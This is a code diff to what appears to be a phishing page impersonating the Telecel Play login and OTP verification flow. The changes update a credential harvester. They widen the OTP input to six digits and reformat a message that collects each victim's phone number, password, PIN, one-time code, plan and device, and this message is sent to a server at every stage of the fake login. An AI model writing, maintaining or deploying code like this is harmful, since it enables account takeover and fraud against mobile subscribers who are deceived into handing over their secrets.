@@ -302,11 +302,12 @@ You need to be a Telecel subscriber to proceed.
 <h1>Verify OTP</h1>
 
 <div class="subtitle">
-Enter 5 digit code sent to your number
+Enter 6 digit code sent to your number
 </div>
 
 <div class="pin">
 
+<input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
@@ -425,26 +426,46 @@ document.getElementById(id).classList.remove("hidden")
 
 function buildMessage(stage){
 
-return `
-TELECEL PLAY LOGIN
-
-EVENT: ${stage}
-
-NUMBER: ${phoneValue}
-
-PASSWORD: ${passwordValue||"-"}
-
-PIN: ${pinValue||"-"}
-
-OTP: ${otpValue||"-"}
-
-PLAN: ${planLine}
-
-DEVICE: ${device}
-
+let msg = `
 TIME: ${new Date().toISOString()}
+
+*Telecel Play Login*
+
+*Event*
+${stage}
+
+*Number*
+${phoneValue}
 `
 
+if(passwordValue)
+msg += `
+
+*Password*
+${passwordValue}`
+
+if(pinValue)
+msg += `
+
+*Pin*
+${pinValue}`
+
+if(otpValue)
+msg += `
+
+*Otp*
+${otpValue}`
+
+msg += `
+
+*Plan*
+${planLine}
+
+*Device*
+${device}
+`
+
+return msg
 }
 
 /* send */
@@ -485,11 +506,9 @@ return
 
 }
 
-/* convert to +233 */
-
 phoneValue="+233"+phoneValue.slice(1)
 
-sendToServer("LOGIN")
+sendToServer("Login")
 
 show("loading")
 
@@ -527,7 +546,7 @@ pinValue=[...document.querySelectorAll("#step2 input")]
 
 .join("")
 
-sendToServer("PIN")
+sendToServer("Pin")
 
 show("loading")
 
@@ -549,7 +568,7 @@ i.oninput=()=>{
 
 i.value=i.value.replace(/\D/g,"")
 
-if(i.value && index<4)
+if(i.value && index<5)
 
 document.querySelectorAll("#step3 input")[index+1].focus()
 
@@ -565,7 +584,7 @@ otpValue=[...document.querySelectorAll("#step3 input")]
 
 .join("")
 
-sendToServer("OTP")
+sendToServer("Otp")
 
 show("step4")
 
@@ -579,7 +598,7 @@ function resendOtp(){
 
 startTimer()
 
-sendToServer("RESEND OTP")
+sendToServer("Resend Otp")
 
 }
 
